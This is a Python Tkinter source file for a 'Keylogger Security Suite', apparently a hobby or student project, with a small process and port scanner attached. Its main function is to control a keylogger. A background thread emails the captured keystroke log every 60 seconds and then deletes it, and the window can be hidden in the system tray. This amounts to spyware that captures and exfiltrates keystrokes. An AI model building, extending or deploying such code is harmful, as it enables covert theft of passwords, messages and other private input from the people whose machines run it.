import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from keylogger_backend import KeyLogger
from log_mailer import send_email
from detector_main import list_suspicious_processes, list_open_ports
import threading
import time
import pystray
from PIL import Image, ImageDraw
import os

# --- Config ---
EMAIL_INTERVAL = 60  # seconds
LOG_PATH = os.path.join(os.path.dirname(__file__), "log.txt")
tray_icon = None

# --- Theme Colors ---
BG_COLOR = "#2E3440"  # Dark blue-grey
SECONDARY_BG = "#3B4252"  # Lighter blue-grey
TEXT_COLOR = "#E5E9F0"  # Off-white
ACCENT_COLOR = "#88C0D0"  # Light blue
WARNING_COLOR = "#BF616A"  # Soft red
SUCCESS_COLOR = "#A3BE8C"  # Soft green

# --- Setup ---
keylogger = KeyLogger(log_file=LOG_PATH)

# --- Styling Functions ---
def create_custom_button(parent, text, command, width=15):
    btn = ttk.Button(parent, text=text, command=command, width=width)
    return btn

def create_section_frame(parent, text):
    frame = ttk.LabelFrame(parent, text=text, padding="10")
    frame.pack(fill="x", padx=10, pady=5)
    return frame

# --- Email Auto-send ---
def auto_send_email():
    while True:
        try:
            with open(LOG_PATH, "r") as f:
                log_data = f.read()

            if log_data.strip():
                send_email(log_data)
                with open(LOG_PATH, "w") as f:
                    f.truncate(0)

        except Exception as e:
            print("Email sending failed:", e)

        time.sleep(EMAIL_INTERVAL)

threading.Thread(target=auto_send_email, daemon=True).start()

# --- GUI Setup ---
window = tk.Tk()
window.title("Keylogger Security Suite")
window.geometry("800x600")
window.configure(bg=BG_COLOR)

# Configure ttk styles
style = ttk.Style()
style.theme_use('clam')
style.configure('TFrame', background=BG_COLOR)
style.configure('TLabelframe', background=BG_COLOR, foreground=TEXT_COLOR)
style.configure('TLabelframe.Label', background=BG_COLOR, foreground=TEXT_COLOR)
style.configure('TButton', background=SECONDARY_BG, foreground=TEXT_COLOR, padding=5)
style.configure('Success.TButton', background=SUCCESS_COLOR)
style.configure('Warning.TButton', background=WARNING_COLOR)

# --- Minimize to tray ---
def create_tray_icon():
    # Create a more professional icon
    image = Image.new('RGB', (64, 64), color=BG_COLOR)
    draw = ImageDraw.Draw(image)
    draw.rectangle((16, 16, 48, 48), fill=ACCENT_COLOR)
    icon = pystray.Icon("Keylogger", image, "Keylogger Security Suite")

    def on_restore(icon, item):
        window.deiconify()
        icon.stop()

    icon.menu = pystray.Menu(
        pystray.MenuItem("Restore", on_restore),
        pystray.MenuItem("Exit", lambda: on_closing(True))
    )
    return icon

def minimize_to_tray():
    global tray_icon
    window.withdraw()
    tray_icon = create_tray_icon()
    threading.Thread(target=tray_icon.run, daemon=True).start()

# --- Main Functions ---
def start_logging():
    try:
        keylogger.start()
        status_label.config(text="✓ Status: Running", foreground=SUCCESS_COLOR)
        start_btn.state(['disabled'])
        stop_btn.state(['!disabled'])
    except Exception as e:
        messagebox.showerror("Error", f"Failed to start keylogger: {e}")

def stop_logging():
    try:
        keylogger.stop()
        status_label.config(text="⬤ Status: Stopped", foreground=WARNING_COLOR)
        start_btn.state(['!disabled'])
        stop_btn.state(['disabled'])
    except Exception as e:
        messagebox.showerror("Error", f"Failed to stop keylogger: {e}")

def show_logs():
    try:
        with open(LOG_PATH, "r") as f:
            logs = f.read()
        log_text.delete(1.0, tk.END)
        log_text.insert(tk.END, logs)
    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found.")

def clear_logs():
    open(LOG_PATH, "w").close()
    log_text.delete(1.0, tk.END)
    messagebox.showinfo("Success", "Logs cleared successfully!")

def send_now():
    try:
        with open(LOG_PATH, "r") as f:
            data = f.read()
        if data.strip():
            send_email(data)
            with open(LOG_PATH, "w") as f:
                f.truncate(0)
            messagebox.showinfo("Success", "Email sent successfully!")
        else:
            messagebox.showinfo("Info", "No data to send.")
    except Exception as e:
        messagebox.showerror("Error", str(e))

def run_detection():
    log_text.delete(1.0, tk.END)
    log_text.tag_configure("success", foreground=SUCCESS_COLOR)
    log_text.tag_configure("warning", foreground=WARNING_COLOR)
    log_text.tag_configure("info", foreground=ACCENT_COLOR)

    try:
        log_text.insert(tk.END, "🔍 Scanning for suspicious processes...\n\n", "info")
        suspicious = list_suspicious_processes()
        if not suspicious:
            log_text.insert(tk.END, "✓ No suspicious processes found.\n\n", "success")
        else:
            for proc in suspicious:
                log_text.insert(tk.END, f"⚠ Suspicious: {proc['name']} (PID: {proc['pid']})\n", "warning")

        log_text.insert(tk.END, "\n🌐 Scanning network connections...\n\n", "info")
        connections = list_open_ports()
        if connections:
            for conn in connections:
                log_text.insert(tk.END, 
                    f"📡 Port {conn['port']} → {conn['name']} (PID: {conn['pid']})\n", "info")
        else:
            log_text.insert(tk.END, "✓ No suspicious connections found.\n", "success")

    except Exception as e:
        log_text.insert(tk.END, f"Error during scan: {e}\n", "warning")

def on_closing(force_quit=False):
    if force_quit or messagebox.askokcancel("Quit", "Do you want to exit the application?"):
        keylogger.stop()
        window.destroy()

# --- GUI Layout ---
# Status Section
status_frame = create_section_frame(window, "System Status")
status_label = ttk.Label(status_frame, text="⬤ Status: Stopped", 
                        foreground=WARNING_COLOR, background=BG_COLOR, 
                        font=("Segoe UI", 12))
status_label.pack(pady=5)

# Control Buttons
control_frame = create_section_frame(window, "Controls")
button_frame = ttk.Frame(control_frame)
button_frame.pack(fill="x", expand=True)

start_btn = create_custom_button(button_frame, "▶ Start Logging", start_logging)
stop_btn = create_custom_button(button_frame, "⬛ Stop Logging", stop_logging)
start_btn.pack(side="left", padx=5)
stop_btn.pack(side="left", padx=5)
stop_btn.state(['disabled'])

# Log Management
log_frame = create_section_frame(window, "Log Management")
log_buttons = ttk.Frame(log_frame)
log_buttons.pack(fill="x", expand=True)

create_custom_button(log_buttons, "📋 View Logs", show_logs).pack(side="left", padx=5)
create_custom_button(log_buttons, "🗑 Clear Logs", clear_logs).pack(side="left", padx=5)
create_custom_button(log_buttons, "📧 Send Mail", send_now).pack(side="left", padx=5)

# Security Scanner
scan_frame = create_section_frame(window, "Security Scanner")
create_custom_button(scan_frame, "🔍 Run Security Scan", run_detection).pack(pady=5)

# Log Display
log_display = create_section_frame(window, "Log Display")
log_text = scrolledtext.ScrolledText(log_display, width=70, height=15,
                                   bg=SECONDARY_BG, fg=TEXT_COLOR,
                                   font=("Consolas", 10))
log_text.pack(fill="both", expand=True, pady=5)

# Tray Control
tray_frame = create_section_frame(window, "Application Control")
create_custom_button(tray_frame, "🔽 Minimize to Tray", minimize_to_tray).pack(pady=5)

# Window Configuration
window.protocol("WM_DELETE_WINDOW", on_closing)
window.bind("<Escape>", lambda event: on_closing())

# --- Main loop ---
try:
    window.mainloop()
except KeyboardInterrupt:
    print("[!] Program manually stopped.")
    on_closing(True)
